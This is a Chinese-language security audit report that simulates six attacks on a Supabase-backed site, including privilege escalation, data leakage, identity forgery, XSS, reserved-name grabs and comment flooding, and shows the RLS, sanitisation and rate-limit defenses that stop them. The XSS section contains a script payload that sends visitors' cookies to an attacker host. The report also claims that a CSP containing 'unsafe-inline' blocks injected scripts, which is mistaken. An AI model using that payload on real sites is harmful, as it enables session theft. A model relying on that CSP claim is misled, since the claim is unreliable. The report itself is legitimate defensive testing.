# 安全审计与攻击模拟报告

## 测试环境
- 数据库：Supabase (PostgreSQL 15 + PostgREST)
- 认证：Supabase Auth (JWT 携带 `sub` 即 `auth.uid()`)
- 暴露面：前端可直连数据库（携带 anon key）

---

## 攻击模拟 1：水平越权（修改别人的主页）
- **攻击手段**：攻击者注册了账号 A，通过抓包或开发者工具，向 `pages` 表发起 `UPDATE` 请求，试图将 `user_id` 为 B 的 `published_data` 改为恶意内容。
- **Payload**：
  ```json
  { "published_data": { "hacked": true } }
  ```
  请求 URL：`PATCH /rest/v1/pages?user_id=eq.<User_B_UUID>`
- **防御结果**：**拦截成功 (403/影响行数0)**。
  - 原因：`create policy "Users can update own page." on pages for update using (auth.uid() = user_id);`
  - RLS 引擎发现请求者的 JWT 中的 `auth.uid()` (A) 不等于条件里的 `user_id` (B)，拒绝更新。

## 攻击模拟 2：隐私泄露（读取草稿数据）
- **攻击手段**：攻击者试图通过 API 爬取全站数据，抓取用户尚未发布的 `draft_data`（可能包含隐私、未完成的画作、联系方式）。
- **Payload**：`GET /rest/v1/pages?select=draft_data`
- **防御结果**：**拦截成功 (只返回公开数据)**。
  - 原因：当攻击者未登录时，RLS 的策略 `is_public = true` 只返回已发布的画布。未发布的草稿行对匿名请求不可见。
  - 如果攻击者登录了账号 A，试图遍历 `GET /rest/v1/pages`，他只能看到所有 `is_public = true` 的，加上他自己那条 `auth.uid() = user_id` 的草稿。完全无法看到 B 的草稿。

## 攻击模拟 3：伪造身份（注入评论）
- **攻击手段**：攻击者登录自己的账号，但在发送评论的请求中，伪造 `user_id` 为受害者 B 的 UUID，企图借刀杀人（冒充别人发垃圾评论）。
- **Payload**：`POST /rest/v1/comments` Body: `{"user_id": "<User_B>", "content": "垃圾广告"}`
- **防御结果**：**拦截成功 (403 Forbidden)**。
  - 原因：`create policy "Authenticated users can insert comments." on comments for insert with check (auth.uid() = user_id);`
  - 插入时，数据库校验 JWT 里的真实 `uid` 必须等于你要插入的 `user_id`。

## 攻击模拟 4：XSS 注入攻击（脚本执行）
- **攻击手段**：攻击者在文章正文或留言板输入 `<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`，试图窃取访问者的登录 Token。
- **防御结果**：**双层防御拦截**。
  - 第一层（前端渲染）：所有写入和渲染的内容经过 `DOMPurify` 过滤，`<script>` 标签直接被剥离，变成纯文本。
  - 第二层（CSP 内容安全策略）：服务端配置 `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' (如果Astro内联);`，即便有恶意脚本被注入，浏览器也会拒绝执行来源不明的脚本。

## 攻击模拟 5：信息收集（扫描系统保留字）
- **攻击手段**：攻击者在注册时不断尝试注册 `admin`, `api`, `arcade`, `root`, `support`，企图接管路由或进行社工欺骗。
- **防御结果**：**拦截成功**。
  - 原因：应用层正则校验 `^[a-z0-9_]{3,20}$` + 系统保留字黑名单强制拦截。

## 攻击模拟 6：资源耗尽（性能打击）
- **攻击手段**：攻击者利用脚本每秒狂发 100 条评论，企图撑爆 500MB 数据库。
- **防御结果**：**部分拦截 / 降级防御**。
  - 原因：Supabase RLS 没法直接做 Rate Limit。必须依赖我们在 Edge Function 写的限流器（每分钟最多 3 条），以及 Cloudflare 层面的防 CC 攻击拦截。
